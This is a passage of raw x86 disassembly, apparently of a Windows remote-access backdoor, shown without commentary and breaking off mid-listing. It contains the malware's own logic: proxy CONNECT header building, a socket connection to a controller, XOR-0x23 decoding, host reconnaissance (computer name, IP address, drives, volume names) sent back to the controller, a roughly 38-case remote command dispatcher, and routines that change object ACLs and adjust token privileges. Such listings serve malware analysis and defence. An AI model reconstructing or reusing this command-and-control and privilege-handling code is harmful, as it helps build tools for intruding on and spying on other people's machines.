repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
and     ecx, 3
rep movsb
mov     edi, offset aPragmaNoCache ; "\r\nPragma: no-cache"
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, ebx
or      ecx, 0FFFFFFFFh
repne scasb
dec     edi
mov     ecx, ebp
shr     ecx, 2
rep movsd
mov     ecx, ebp
pop     ebp
and     ecx, 3
cmp     edx, 1
rep movsb
jnz     loc_40369B
mov     edi, offset aContentLength ; "\r\nContent-Length: "
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
push    0Ah             ; Radix
mov     esi, edi
mov     edx, ecx
mov     edi, ebx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
lea     eax, [esp+20h+var_10]
and     ecx, 3
push    eax             ; DstBuf
rep movsb
mov     ecx, [esp+24h+arg_14]
push    ecx             ; Val
call    ds:_itoa
lea     edi, [esp+28h+var_10]
or      ecx, 0FFFFFFFFh
xor     eax, eax
add     esp, 0Ch
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, ebx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
mov     edi, offset aProxyConnectio ; "\r\nProxy-Connection: Keep-Alive"
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, ebx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb

loc_40369B:
mov     edi, offset asc_40982C ; "\r\n\r\n"
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, ebx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
pop     edi
pop     esi
pop     ebx
add     esp, 10h
retn
sub_403410 endp

align 10h



sub_4036D0 proc near

var_2008= dword ptr -2008h
var_2004= dword ptr -2004h
Str= byte ptr -2000h
var_1FFF= byte ptr -1FFFh
arg_0= dword ptr  4

mov     eax, 2008h
call    __alloca_probe
push    ebx
mov     ebx, [esp+200Ch+arg_0]
push    ebp
mov     ebp, ds:WSOCK32_16
push    esi
push    edi
xor     edi, edi
lea     esi, [esp+2018h+Str]
mov     [esp+2018h+var_2004], edi
mov     [esp+2018h+var_2008], edi

loc_4036F9:
push    0
push    1
push    esi
push    ebx
call    ebp ; WSOCK32_16
test    eax, eax
jz      loc_40379F
cmp     eax, 0FFFFFFFFh
jnz     short loc_403733
call    ds:WSOCK32_111
cmp     eax, 2733h
jnz     loc_40379F
push    1               ; dwMilliseconds
call    ds:Sleep
mov     eax, edi
inc     edi
cmp     eax, 1388h
jg      short loc_40379F
jmp     short loc_4036F9

loc_403733:
mov     al, [esi]
cmp     al, 0Dh
jz      short loc_403747
cmp     al, 0Ah
jz      short loc_403747
mov     [esp+2018h+var_2004], 0
jmp     short loc_403755

loc_403747:
mov     eax, [esp+2018h+var_2004]
inc     eax
cmp     eax, 4
mov     [esp+2018h+var_2004], eax
jge     short loc_403770

loc_403755:
mov     eax, [esp+2018h+var_2008]
inc     eax
inc     esi
cmp     eax, 2000h
mov     [esp+2018h+var_2008], eax
ja      short loc_40379F
push    1               ; dwMilliseconds
call    ds:Sleep
jmp     short loc_4036F9

loc_403770:
mov     ecx, [esp+2018h+var_2008]
lea     edx, [esp+2018h+Str]
push    offset a200Ok   ; "200 OK"
push    edx             ; Str
mov     [esp+ecx+2020h+var_1FFF], 0
call    ds:strstr
add     esp, 8
neg     eax
sbb     eax, eax
pop     edi
and     eax, 2
pop     esi
pop     ebp
dec     eax
pop     ebx
add     esp, 2008h
retn

loc_40379F:
pop     edi
pop     esi
pop     ebp
or      eax, 0FFFFFFFFh
pop     ebx
add     esp, 2008h
retn
sub_4036D0 endp

align 10h



sub_4037B0 proc near

arg_0= dword ptr  4
arg_4= dword ptr  8
arg_8= dword ptr  0Ch
arg_C= dword ptr  10h

mov     eax, [esp+arg_C]
push    esi
mov     esi, [esp+4+arg_4]
test    esi, esi
mov     [eax], esi
jle     short loc_4037D5
mov     eax, [esp+4+arg_8]
mov     ecx, [esp+4+arg_0]
sub     ecx, eax

loc_4037C9:
mov     dl, [ecx+eax]
xor     dl, 23h
mov     [eax], dl
inc     eax
dec     esi
jnz     short loc_4037C9

loc_4037D5:
pop     esi
retn
sub_4037B0 endp

align 10h



sub_4037E0 proc near

nSize= dword ptr -104h
var_100= byte ptr -100h

sub     esp, 104h
push    esi
lea     eax, [esp+108h+nSize]
push    edi
push    eax             ; nSize
push    offset Buffer   ; lpBuffer
mov     [esp+114h+nSize], 0FFh
call    ds:GetComputerNameA
mov     ecx, [esp+10Ch+nSize]
lea     edx, [esp+10Ch+var_100]
push    0FFh
push    edx
mov     Buffer[ecx], 0
call    ds:WSOCK32_57
test    eax, eax
jnz     short loc_40386E
lea     eax, [esp+10Ch+var_100]
push    eax
call    ds:WSOCK32_52
test    eax, eax
jz      short loc_403840
mov     ecx, [eax+0Ch]
mov     edx, [ecx]
mov     eax, [edx]
push    eax
call    ds:WSOCK32_11
mov     edi, eax
jmp     short loc_403873

loc_403840:
mov     edi, offset Class
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, offset unk_40AAC4
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
pop     edi
pop     esi
add     esp, 104h
retn

loc_40386E:
mov     edi, offset Class

loc_403873:
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     edx, ecx
mov     esi, edi
mov     edi, offset unk_40AAC4
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
pop     edi
pop     esi
add     esp, 104h
retn
sub_4037E0 endp

align 10h



sub_4038A0 proc near

arg_0= dword ptr  4

mov     eax, [esp+arg_0]
push    eax
call    ds:WSOCK32_52
test    eax, eax
jz      short loc_4038BE
mov     ecx, [eax+0Ch]
mov     edx, [ecx]
mov     eax, [edx]
push    eax
call    ds:WSOCK32_11
retn

loc_4038BE:
xor     eax, eax
retn
sub_4038A0 endp

align 10h



sub_4038D0 proc near

var_124= dword ptr -124h
var_120= dword ptr -120h
var_11C= dword ptr -11Ch
var_118= dword ptr -118h
var_114= dword ptr -114h
ThreadId= dword ptr -108h
var_104= dword ptr -104h
var_100= dword ptr -100h

sub     esp, 124h
push    0
push    1
push    2
call    ds:WSOCK32_23
cmp     eax, 0FFFFFFFFh
mov     dword_40A09C, eax
jnz     short loc_4038F5
xor     eax, eax
add     esp, 124h
retn

loc_4038F5:
lea     ecx, [esp+124h+var_124]
mov     [esp+124h+var_124], 1
push    ecx
push    8004667Eh
push    eax
call    ds:WSOCK32_12
mov     eax, dword_40AA1C
mov     edx, dword_40A09C
test    eax, eax
mov     [esp+124h+var_120], 3Ch
mov     [esp+124h+var_11C], 0
mov     [esp+124h+var_100], edx
mov     [esp+124h+var_104], 1
mov     word ptr [esp+124h+var_118], 2
jz      short loc_403963
mov     ax, word ptr dword_40AA18
push    eax
call    ds:WSOCK32_9
push    offset unk_40A9F8
mov     word ptr [esp+128h+var_118+2], ax
call    ds:WSOCK32_10
mov     [esp+124h+var_114], eax
jmp     short loc_40397A

loc_403963:
push    50h
call    ds:WSOCK32_9
mov     ecx, dword_40A128
mov     word ptr [esp+124h+var_118+2], ax
mov     [esp+124h+var_114], ecx

loc_40397A:
mov     eax, dword_40A09C
lea     edx, [esp+124h+var_118]
push    10h
push    edx
push    eax
call    ds:WSOCK32_4
mov     eax, dword_40A09C
lea     ecx, [esp+124h+var_120]
push    ecx
lea     edx, [esp+128h+var_104]
push    0
push    edx
inc     eax
push    0
push    eax
call    ds:WSOCK32_18
test    eax, eax
jg      short loc_4039C2
mov     ecx, dword_40A09C
push    ecx
call    ds:WSOCK32_3
xor     eax, eax
add     esp, 124h
retn

loc_4039C2:
mov     eax, dword_40A8B0
test    eax, eax
jnz     short loc_4039DB
call    sub_403FE0
test    eax, eax
jnz     short loc_4039DB
add     esp, 124h
retn

loc_4039DB:
mov     eax, hObject
test    eax, eax
jz      short loc_4039F5
push    eax             ; hObject
call    ds:CloseHandle
mov     hObject, 0

loc_4039F5:
lea     edx, [esp+124h+ThreadId]
push    edx             ; lpThreadId
push    0               ; dwCreationFlags
push    0               ; lpParameter
push    offset sub_403D80 ; lpStartAddress
push    0               ; dwStackSize
push    0               ; lpThreadAttributes
call    ds:CreateThread
test    eax, eax
mov     hObject, eax
jnz     short loc_403A2B
mov     eax, dword_40A09C
push    eax
call    ds:WSOCK32_3
xor     eax, eax
add     esp, 124h
retn

loc_403A2B:
mov     eax, 1
add     esp, 124h
retn
sub_4038D0 endp

align 10h



sub_403A40 proc near

var_100= byte ptr -100h
var_FF= dword ptr -0FFh
var_FB= byte ptr -0FBh

sub     esp, 100h
push    ebx
mov     ebx, ds:LoadLibraryA
push    ebp
push    esi
push    edi
push    offset LibFileName ; "Kernel32.dll"
call    ebx ; LoadLibraryA
mov     ebp, ds:GetProcAddress
push    offset aGettickcount ; "GetTickCount"
push    eax             ; hModule
call    ebp ; GetProcAddress
mov     ecx, dword_40A080
mov     esi, dword_40A094
mov     edi, lpPathName
mov     edx, ecx
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
movsx   edx, byte_40A08C
mov     ecx, dword_40A080
xor     edi, edi
mov     dword_40A084, ecx
mov     dword_40A088, edx
mov     dword_40A07C, edi
mov     dword_40A06C, edi
call    eax
mov     dword_40A098, eax
mov     eax, dword_40A088
add     eax, 0FFFFFFBFh ; switch 38 cases
cmp     eax, 25h
ja      loc_403C0C      ; jumptable 00403AC4 default case
jmp     ds:off_403C94[eax*4] ; switch jump

loc_403ACB:             ; jumptable 00403AC4 case 66
call    sub_404D30
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403AD5:             ; jumptable 00403AC4 case 82
call    sub_404AC0
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403ADF:             ; jumptable 00403AC4 case 68
call    sub_404AE0
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403AE9:             ; jumptable 00403AC4 case 75
call    sub_404A90
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403AF3:             ; jumptable 00403AC4 case 70
call    sub_404A20
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403AFD:             ; jumptable 00403AC4 case 67
call    sub_404570
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403B07:             ; jumptable 00403AC4 case 73
call    sub_404C00
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403B11:             ; jumptable 00403AC4 case 80
call    sub_405470
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403B1B:             ; jumptable 00403AC4 case 77
call    sub_404C40
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403B25:             ; jumptable 00403AC4 case 71
call    sub_404CF0
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403B2F:             ; jumptable 00403AC4 case 72
call    sub_404CD0
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403B39:             ; jumptable 00403AC4 cases 65,74,83
call    sub_4059F0
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403B43:             ; jumptable 00403AC4 case 78
push    4Eh
call    sub_405A10
add     esp, 4
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403B52:             ; jumptable 00403AC4 case 79
call    sub_405B50
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403B5C:             ; jumptable 00403AC4 cases 69,86
call    sub_405CD0
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403B66:             ; jumptable 00403AC4 case 89
call    sub_405A60
jmp     loc_403C0C      ; jumptable 00403AC4 default case

loc_403B70:             ; jumptable 00403AC4 case 84
push    offset aShell32Dll_0
call    ebx ; LoadLibraryA
mov     esi, eax
push    offset aShgetspecialfo ; "SHGetSpecialFolderPathA"
push    esi             ; hModule
call    ebp ; GetProcAddress
push    esi             ; hLibModule
mov     ebx, eax
call    ds:FreeLibrary
push    1
push    25h
push    offset byte_409F3C
push    edi
call    ebx
mov     edi, offset aTemp1020Txt ; "\\Temp1020.txt"
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, offset byte_409F3C
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     eax, lpPathName
mov     ecx, edx
and     ecx, 3
push    eax
rep movsb
call    sub_406BF0
add     esp, 4
xor     edi, edi
jmp     short loc_403C0C ; jumptable 00403AC4 default case

loc_403BD5:             ; jumptable 00403AC4 case 87
call    sub_406050
jmp     short loc_403C0C ; jumptable 00403AC4 default case

loc_403BDC:             ; jumptable 00403AC4 case 88
mov     dword_40ACEC, edi
jmp     short loc_403C0C ; jumptable 00403AC4 default case

loc_403BE4:             ; jumptable 00403AC4 case 85
call    sub_406AE0
jmp     short loc_403C0C ; jumptable 00403AC4 default case

loc_403BEB:             ; jumptable 00403AC4 case 97
call    sub_406F30
jmp     short loc_403C0C ; jumptable 00403AC4 default case

loc_403BF2:             ; jumptable 00403AC4 case 98
call    sub_406FC0
jmp     short loc_403C0C ; jumptable 00403AC4 default case

loc_403BF9:             ; jumptable 00403AC4 cases 99,102
call    sub_407000
jmp     short loc_403C0C ; jumptable 00403AC4 default case

loc_403C00:             ; jumptable 00403AC4 case 100
call    sub_407060
jmp     short loc_403C0C ; jumptable 00403AC4 default case

loc_403C07:             ; jumptable 00403AC4 case 101
call    sub_4070A0

loc_403C0C:             ; jumptable 00403AC4 default case
mov     eax, dword_40A074
mov     dword_40A06C, 1
cmp     eax, edi
jz      short loc_403C82
mov     dword_40A074, edi
mov     edi, offset unk_409010
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
add     ecx, 4
mov     edi, offset unk_409010
mov     [esp+110h+var_FF], ecx
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
lea     edx, [esp+110h+var_FB]
mov     eax, ecx
mov     esi, edi
mov     edi, edx
mov     [esp+110h+var_100], 5Ah
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset unk_409010
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
add     ecx, 4
push    ecx
lea     ecx, [esp+114h+var_100]
push    ecx
call    sub_402980
add     esp, 8

loc_403C82:
pop     edi
pop     esi
pop     ebp
mov     eax, 1
pop     ebx
add     esp, 100h
retn
sub_403A40 endp

align 4
off_403C94 dd offset loc_403B39 ; jump table for switch statement
dd offset loc_403ACB
dd offset loc_403AFD
dd offset loc_403ADF
dd offset loc_403B5C
dd offset loc_403AF3
dd offset loc_403B25
dd offset loc_403B2F
dd offset loc_403B07
dd offset loc_403B39
dd offset loc_403AE9
dd offset loc_403C0C
dd offset loc_403B1B
dd offset loc_403B43
dd offset loc_403B52
dd offset loc_403B11
dd offset loc_403C0C
dd offset loc_403AD5
dd offset loc_403B39
dd offset loc_403B70
dd offset loc_403BE4
dd offset loc_403B5C
dd offset loc_403BD5
dd offset loc_403BDC
dd offset loc_403B66
dd offset loc_403C0C
dd offset loc_403C0C
dd offset loc_403C0C
dd offset loc_403C0C
dd offset loc_403C0C
dd offset loc_403C0C
dd offset loc_403C0C
dd offset loc_403BEB
dd offset loc_403BF2
dd offset loc_403BF9
dd offset loc_403C00
dd offset loc_403C07
dd offset loc_403BF9
align 10h


; Attributes: noreturn

; DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
StartAddress proc near

lpThreadParameter= dword ptr  4

push    ebx
mov     ebx, ds:ExitProcess
push    ebp
mov     ebp, ds:WaitForSingleObject
push    esi
mov     esi, ds:SetEvent
push    edi
mov     edi, ds:WSOCK32_116

loc_403D4C:
mov     eax, hEvent
push    0               ; dwMilliseconds
push    eax             ; hHandle
call    ebp ; WaitForSingleObject
test    eax, eax
jnz     short loc_403D69
mov     ecx, hHandle
push    ecx             ; hEvent
call    esi ; SetEvent
call    edi ; WSOCK32_116
push    1               ; uExitCode
call    ebx ; ExitProcess

loc_403D69:             ; dwMilliseconds
push    3E8h
call    ds:Sleep
jmp     short loc_403D4C
StartAddress endp

align 10h



; DWORD __stdcall sub_403D80(LPVOID lpThreadParameter)
sub_403D80 proc near

var_2004= dword ptr -2004h
var_2000= byte ptr -2000h
var_1FFF= dword ptr -1FFFh
lpThreadParameter= dword ptr  4

mov     eax, 2004h
call    __alloca_probe
push    ebx
mov     ebx, ds:Sleep
push    ebp
mov     ebp, [esp+200Ch+var_2004]
push    esi
push    edi
mov     dword_40A8B0, 0

loc_403DA2:
mov     al, byte_40A08C
test    al, al
jnz     short loc_403E00
call    sub_403EE0
test    eax, eax
jz      loc_403EAE
lea     eax, [esp+2014h+var_2000]
push    5
push    eax
call    sub_403F60
add     esp, 8
cmp     eax, 0FFFFFFFFh
jz      loc_403EAE
mov     ebp, [esp+2014h+var_1FFF]
cmp     ebp, 5
jl      short loc_403DA2
mov     al, [esp+2014h+var_2000]
cmp     al, 5Ah
jnz     short loc_403DED
mov     dword_40A074, 1
jmp     short loc_403DA2

loc_403DED:
cmp     al, 51h
jnz     short loc_403E04
mov     ecx, dword_40A060
push    ecx             ; hEvent
call    ds:SetEvent
jmp     short loc_403DA2

loc_403E00:
mov     al, [esp+2014h+var_2000]

loc_403E04:
mov     byte_40A08C, al
sub     ebp, 5
mov     dword_40A078, 0

loc_403E16:
lea     edx, [esp+2014h+var_2000]
push    ebp
push    edx
call    sub_403F60
add     esp, 8
cmp     eax, 0FFFFFFFFh
mov     dword_40A080, eax
jz      short loc_403EA7
mov     edi, dword_40A094
mov     ecx, eax
lea     esi, [esp+2014h+var_2000]
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
sub     ebp, dword_40A080
test    ebp, ebp
jg      short loc_403E72
mov     eax, dword_40A06C
test    eax, eax
jnz     short loc_403E66

loc_403E59:             ; dwMilliseconds
push    1
call    ebx ; Sleep
mov     eax, dword_40A06C
test    eax, eax
jz      short loc_403E59

loc_403E66:
mov     dword_40A8B4, 1
jmp     short loc_403E7C

loc_403E72:
mov     dword_40A8B4, 0

loc_403E7C:
mov     dword_40A07C, 1

loc_403E86:             ; dwMilliseconds
push    1
call    ebx ; Sleep
mov     eax, dword_40A07C
test    eax, eax
jnz     short loc_403E86
test    ebp, ebp
jg      loc_403E16
mov     byte_40A08C, 0
jmp     loc_403DA2

loc_403EA7:
mov     byte_40A08C, 0

loc_403EAE:
mov     eax, dword_40A8B0
pop     edi
pop     esi
pop     ebp
test    eax, eax
pop     ebx
jnz     short loc_403EC5
mov     dword_40ACEC, 0

loc_403EC5:
mov     dword_40A8AC, 1
xor     eax, eax
add     esp, 2004h
retn    4
sub_403D80 endp

align 10h



sub_403EE0 proc near

var_1= byte ptr -1

push    ecx
push    ebx
mov     ebx, ds:Sleep
push    ebp
mov     ebp, ds:WSOCK32_111
push    esi
mov     esi, ds:WSOCK32_16
push    edi
xor     edi, edi

loc_403EF9:
mov     ecx, dword_40A09C
push    0
lea     eax, [esp+18h+var_1]
push    1
push    eax
push    ecx
call    esi ; WSOCK32_16
cmp     eax, 0FFFFFFFFh
jnz     short loc_403F1F
call    ebp ; WSOCK32_111
cmp     eax, 2733h
jnz     short loc_403F43
push    1               ; dwMilliseconds
call    ebx ; Sleep
jmp     short loc_403EF9

loc_403F1F:
test    eax, eax
jle     short loc_403F3D
mov     al, [esp+14h+var_1]
cmp     al, 0Dh
jz      short loc_403F37
cmp     al, 0Ah
jz      short loc_403F37
push    1               ; dwMilliseconds
xor     edi, edi
call    ebx ; Sleep
jmp     short loc_403EF9

loc_403F37:
inc     edi
cmp     edi, 4
jge     short loc_403F4B

loc_403F3D:             ; dwMilliseconds
push    1
call    ebx ; Sleep
jmp     short loc_403EF9

loc_403F43:
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
pop     ecx
retn

loc_403F4B:
pop     edi
pop     esi
pop     ebp
mov     eax, 1
pop     ebx
pop     ecx
retn
sub_403EE0 endp

align 10h



sub_403F60 proc near

arg_0= dword ptr  4
arg_4= dword ptr  8

push    ebx
push    ebp
push    esi
push    edi
mov     edi, [esp+10h+arg_4]
xor     esi, esi
xor     ebx, ebx
cmp     edi, 2000h
jle     short loc_403F7B
mov     edi, 2000h
jmp     short loc_403F7F

loc_403F7B:
test    edi, edi
jle     short loc_403FC8

loc_403F7F:
mov     ebp, [esp+10h+arg_0]

loc_403F83:
mov     edx, dword_40A09C
mov     eax, edi
sub     eax, esi
push    0
lea     ecx, [esi+ebp]
push    eax
push    ecx
push    edx
call    ds:WSOCK32_16
test    eax, eax
jg      short loc_403FB8
call    ds:WSOCK32_111
cmp     eax, 2733h
jnz     short loc_403FCF
mov     eax, ebx
inc     ebx
cmp     eax, 1770h
jg      short loc_403FCF
jmp     short loc_403FBC

loc_403FB8:
add     esi, eax
xor     ebx, ebx

loc_403FBC:             ; dwMilliseconds
push    1
call    ds:Sleep
cmp     esi, edi
jl      short loc_403F83

loc_403FC8:
mov     eax, edi
pop     edi
pop     esi
pop     ebp
pop     ebx
retn

loc_403FCF:
pop     edi
pop     esi
pop     ebp
or      eax, 0FFFFFFFFh
pop     ebx
retn
sub_403F60 endp

align 10h



sub_403FE0 proc near

var_48C= dword ptr -48Ch
var_488= dword ptr -488h
var_484= dword ptr -484h
VolumeNameBuffer= byte ptr -480h
var_400= dword ptr -400h
var_3FB= byte ptr -3FBh
Buffer= byte ptr -200h

sub     esp, 48Ch
push    ebp
push    esi
push    edi
mov     edi, offset Buffer
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
lea     edx, [esp+498h+var_3FB]
mov     eax, ecx
mov     esi, edi
mov     edi, edx
mov     byte ptr [esp+498h+var_400], 41h
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
lea     edx, [esp+498h+Buffer]
rep movsb
mov     edi, offset Buffer
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
push    edx             ; lpBuffer
mov     ebp, ecx
mov     ecx, Data
add     ebp, 6
push    200h            ; nBufferLength
mov     [esp+4A0h+var_488], 0
mov     [esp+ebp+4A0h+var_400], ecx
add     ebp, 4
call    ds:GetLogicalDriveStringsA
test    eax, eax
jz      loc_404158
mov     al, [esp+498h+Buffer]
test    al, al
jz      loc_404158
push    ebx
lea     ebx, [esp+49Ch+Buffer]

loc_404078:
mov     edi, ebx
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     esi, [esp+ebp+49Ch+var_400]
repne scasb
not     ecx
dec     ecx
mov     edi, ebx
mov     edx, ecx
or      ecx, 0FFFFFFFFh
inc     edx
mov     [esp+49Ch+var_48C], esi
repne scasb
not     ecx
sub     edi, ecx
push    ebx             ; lpRootPathName
mov     eax, ecx
mov     esi, edi
mov     edi, [esp+4A0h+var_48C]
mov     [esp+4A0h+var_484], edx
shr     ecx, 2
rep movsd
mov     ecx, eax
add     ebp, edx
and     ecx, 3
rep movsb
call    ds:GetDriveTypeA
cmp     eax, 2
mov     [esp+49Ch+var_48C], eax
jz      short loc_4040E6
push    0               ; nFileSystemNameSize
push    0               ; lpFileSystemNameBuffer
push    0               ; lpFileSystemFlags
push    0               ; lpMaximumComponentLength
push    0               ; lpVolumeSerialNumber
lea     ecx, [esp+4B0h+VolumeNameBuffer]
push    80h             ; nVolumeNameSize
push    ecx             ; lpVolumeNameBuffer
push    ebx             ; lpRootPathName
call    ds:GetVolumeInformationA
test    eax, eax
jnz     short loc_4040EB

loc_4040E6:
mov     [esp+49Ch+VolumeNameBuffer], 0

loc_4040EB:
lea     edi, [esp+49Ch+VolumeNameBuffer]
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+ebp+49Ch+var_400]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
lea     edi, [esp+49Ch+VolumeNameBuffer]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
mov     eax, [esp+49Ch+var_488]
dec     ecx
lea     ebp, [ecx+ebp+1]
mov     ecx, [esp+49Ch+var_48C]
mov     [esp+ebp+49Ch+var_400], ecx
mov     ecx, [esp+49Ch+var_484]
add     eax, ecx
add     ebp, 4
mov     [esp+49Ch+var_488], eax
lea     ebx, [esp+eax+49Ch+Buffer]
mov     al, [esp+eax+49Ch+Buffer]
test    al, al
jnz     loc_404078
pop     ebx

loc_404158:
lea     edx, [esp+498h+var_400]
push    ebp
push    edx
mov     [esp+4A0h+var_400+1], ebp
call    sub_402980
add     esp, 8
pop     edi
pop     esi
pop     ebp
add     esp, 48Ch
retn
sub_403FE0 endp

align 10h



; int __cdecl sub_404180(HANDLE handle, PACL NewAcl)
sub_404180 proc near

var_2C= byte ptr -2Ch
var_2B= byte ptr -2Bh
var_2A= byte ptr -2Ah
var_29= byte ptr -29h
var_28= byte ptr -28h
var_27= byte ptr -27h
var_26= byte ptr -26h
var_25= byte ptr -25h
var_24= dword ptr -24h
pListOfExplicitEntries= _EXPLICIT_ACCESS_A ptr -20h
handle= dword ptr  4
NewAcl= dword ptr  8

sub     esp, 2Ch
mov     ecx, [esp+2Ch+NewAcl]
lea     edx, [esp+2Ch+var_2C]
mov     [esp+2Ch+pListOfExplicitEntries.grfAccessPermissions], ecx
push    ebx
lea     ecx, [esp+30h+NewAcl]
xor     ebx, ebx
mov     [esp+30h+pListOfExplicitEntries.Trustee.ptstrName], edx
push    ecx             ; NewAcl
lea     edx, [esp+34h+pListOfExplicitEntries]
mov     eax, 1
push    ebx             ; OldAcl
push    edx             ; pListOfExplicitEntries
push    eax             ; cCountOfExplicitEntries
mov     [esp+40h+var_2C], al
mov     [esp+40h+var_2B], al
mov     [esp+40h+var_2A], bl
mov     [esp+40h+var_29], bl
mov     [esp+40h+var_28], bl
mov     [esp+40h+var_27], bl
mov     [esp+40h+var_26], bl
mov     [esp+40h+var_25], al
mov     [esp+40h+var_24], ebx
mov     [esp+40h+pListOfExplicitEntries.grfAccessMode], 2
mov     [esp+40h+pListOfExplicitEntries.grfInheritance], ebx
mov     [esp+40h+pListOfExplicitEntries.Trustee.pMultipleTrustee], ebx
mov     [esp+40h+pListOfExplicitEntries.Trustee.MultipleTrusteeOperation], ebx
mov     [esp+40h+pListOfExplicitEntries.Trustee.TrusteeForm], ebx
mov     [esp+40h+pListOfExplicitEntries.Trustee.TrusteeType], eax
mov     [esp+40h+NewAcl], ebx
call    SetEntriesInAclA
test    eax, eax
jnz     short loc_404225
mov     eax, [esp+30h+NewAcl]
mov     ecx, [esp+30h+handle]
push    esi
push    ebx             ; pSacl
push    eax             ; pDacl
push    ebx             ; psidGroup
push    ebx             ; psidOwner
push    4               ; SecurityInfo
push    6               ; ObjectType
push    ecx             ; handle
call    SetSecurityInfo
mov     edx, [esp+34h+NewAcl]
mov     esi, eax
push    edx             ; hMem
call    ds:LocalFree
xor     eax, eax
cmp     esi, ebx
pop     esi
pop     ebx
setz    al
add     esp, 2Ch
retn

loc_404225:
xor     eax, eax
pop     ebx
add     esp, 2Ch
retn
sub_404180 endp

align 10h



; int __cdecl sub_404230(HANDLE TokenHandle, LPCSTR lpName, PTOKEN_PRIVILEGES PreviousState)
sub_404230 proc near

NewState= _TOKEN_PRIVILEGES ptr -10h
TokenHandle= dword ptr  4
lpName= dword ptr  8
PreviousState= dword ptr  0Ch

sub     esp, 10h
mov     ecx, [esp+10h+lpName]
lea     eax, [esp+10h+NewState.Privileges]
push    eax             ; lpLuid
push    ecx             ; lpName
push    0               ; lpSystemName
mov     [esp+1Ch+NewState.PrivilegeCount], 1
mov     [esp+1Ch+NewState.Privileges.Attributes], 2
call    ds:LookupPrivilegeValueA
test    eax, eax
jz      short loc_404299
mov     eax, [esp+10h+PreviousState]
lea     edx, [esp+10h+lpName]
push    edx             ; ReturnLength
mov     edx, [esp+14h+TokenHandle]
push    eax             ; PreviousState
lea     ecx, [esp+18h+NewState]
push    10h             ; BufferLength
push    ecx             ; NewState
push    0               ; DisableAllPrivileges
push    edx             ; TokenHandle
mov     [esp+28h+lpName], 10h
call    ds:AdjustTokenPrivileges
test    eax, eax
jz      short loc_404299
call    ds:GetLastError
xor     ecx, ecx
cmp     eax, 514h
setnz   cl
mov     eax, ecx
add     esp, 10h
retn

loc_404299:
xor     eax, eax
add     esp, 10h
retn
sub_404230 endp

align 10h



; int __cdecl sub_4042A0(HANDLE TokenHandle, PTOKEN_PRIVILEGES NewState)
sub_4042A0 proc near

TokenHandle= dword ptr  4
NewState= dword ptr  8

mov     eax, [esp+NewState]
mov     ecx, [esp+TokenHandle]
push    0               ; ReturnLength
push    0               ; PreviousState
push    0               ; BufferLength
push    eax             ; NewState
push    0               ; DisableAllPrivileges
push    ecx             ; TokenHandle
call    ds:AdjustTokenPrivileges
retn
sub_4042A0 endp

align 10h



; int __cdecl sub_4042C0(DWORD dwProcessId, DWORD dwDesiredAccess)
